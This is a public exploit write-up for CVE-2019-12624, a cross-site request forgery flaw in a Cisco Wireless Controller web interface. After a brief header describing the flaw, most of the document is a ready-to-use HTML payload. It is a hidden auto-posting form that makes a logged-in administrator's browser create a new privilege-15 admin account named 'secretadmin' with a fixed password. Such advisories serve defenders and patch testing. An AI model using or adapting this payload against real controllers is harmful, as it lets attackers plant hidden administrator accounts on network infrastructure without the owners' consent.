# Product : Cisco Wireless Controller
# Version : 3.6.10E (last version)
# Date: 23.07.2019
# Vendor Homepage: https://www.cisco.com
# Exploit Author: Mehmet Önder Key
# Website: htts://cloudvist.com
# CVE: CVE-2019-12624
# Description : The application interface allows users to perform certain
actions via HTTP requests without performing any validity checks to verify
the requests. This can be exploited to perform certain actions with
administrative privileges if a logged-in user visits a malicious web site.
# Tested On : Win10 & KaliLinux

Add Admin CSRF Payload @Cisco Wireless Controller
---------------
<html>
  <body>
    <form action="http://IP/security/cfgSecurityAAAUsersCreate
<http://192.168.115.83/security/cfgSecurityAAAUsersCreate>" method="POST">
      <input type="hidden" name="username" value="secretadmin" />
      <input type="hidden" name="privilege" value="15" />
      <input type="hidden" name="password" value="K3Y" />
      <input type="hidden" name="description" value="CSRF" />
      <input type="hidden" name="type" value="lobby-admin" />
      <input type="hidden" name="cfnpassword" value="K3Y" />
      <input type="hidden" name="yearlife" value="2013" />
      <input type="hidden" name="hourlife" value="16" />
      <input type="hidden" name="monthlife" value="7" />
      <input type="hidden" name="minlife" value="17" />
      <input type="hidden" name="datelife" value="16" />
      <input type="hidden" name="seclife" value="0" />
      <input type="submit" value="submit" />
    </form>
  </body>
</html>